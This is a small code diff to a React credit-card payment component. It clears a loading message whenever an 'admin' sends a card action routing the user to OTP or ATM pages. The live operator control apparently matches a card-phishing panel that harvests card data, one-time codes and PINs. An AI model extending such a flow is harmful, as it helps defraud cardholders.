@@ -180,6 +180,9 @@ export default function CreditCardPayment() {
   // Handle card action from admin
   useSignalEffect(() => {
     if (cardAction.value) {
+      // إخفاء اللودر فوراً عند استلام أي إجراء من الأدمن
+      waitingMessage.value = "";
+      
       if (cardAction.value === 'otp') {
         navigate("/otp-verification");
       } else if (cardAction.value === 'atm') {
